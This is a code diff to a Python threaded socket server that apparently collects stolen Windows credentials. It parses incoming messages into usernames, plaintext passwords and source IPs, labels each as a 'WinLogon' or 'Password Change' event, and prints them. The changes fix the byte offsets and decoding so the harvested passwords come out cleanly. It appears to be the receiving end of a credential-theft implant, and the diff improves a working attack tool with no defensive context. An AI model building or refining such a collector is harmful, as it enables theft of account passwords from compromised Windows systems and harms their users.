@@ -9,18 +9,20 @@ print_lock = threading.Lock()
 
 def handle_client(conn, addr, args):
     data = conn.recv(1024)
-    username = str(data[2 : data.index(b"\x11") - 2])
-    password = str(data[data.index(b"\x11") : data.index(b"\x12")])
+    print("TEST ", data)
+    password = (data[data.index(b"\x11") + 1 : data.index(b"\x12")]).decode('ascii', errors='ignore')
 
     if b"\x40\x40" in data: # @@ 
         type = "WinLogon"
+        username = (data[ : data.index(b"\x40\x40")]).decode('ascii', errors='ignore')
     else:
         type = "Password Change"
+        username = (data[ : data.index(b"\x11")]).decode('ascii', errors='ignore')
     if "cloudbase" in username:
         return
 
     timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
-    ip = str(data[data.index(b"\x12") : len(data) - 2])
+    ip = (data[data.index(b"\x12") + 1 : len(data)]).decode('ascii', errors='ignore')
     storage = f"\nTimestamp: {timestamp}\nSource: {ip}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
 
@@ -133,7 +135,7 @@ def main():
     try:
         while True:
             conn, addr = s.accept()
-            t = threading.Thread(target=handle_client, args=(conn, addr, args))
+            t = threading.Thread(target=handle_client, args=(conn, addr, args,))
             t.start()
 
     except KeyboardInterrupt:
